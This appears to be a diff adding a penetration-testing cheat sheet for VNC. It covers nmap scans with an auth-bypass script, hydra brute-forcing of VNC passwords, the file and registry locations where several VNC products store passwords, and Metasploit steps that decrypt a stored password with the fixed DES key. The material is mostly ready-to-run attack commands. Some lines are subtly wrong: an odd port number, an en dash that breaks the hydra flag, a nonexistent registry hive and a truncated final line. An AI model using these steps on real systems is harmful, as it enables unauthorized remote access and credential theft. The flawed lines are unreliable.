@@ -1,0 +1,34 @@
+# VNC - 5800 - 58001 - 5900 - 5901
+# Scans
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
+
+# Brute force
+hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
+
+# Connect
+vncviewer <IP>:<PORT>
+
+# Found VNC password
+# Linux
+Default password is stored in: ~/.vnc/passwd
+
+# Windows
+# RealVNC
+HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
+
+# TightVNC
+HKEY_CURRENT_USER\Software\TightVNC\Server
+
+# TigerVNC
+HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
+
+# UltraVNC
+C:\Program Files\UltraVNC\ultravnc.ini
+
+# Decrypt VNC password
+msfconsole
+irb
+fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+require 'rex/proto/rfb'
+Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
+/dev/nul
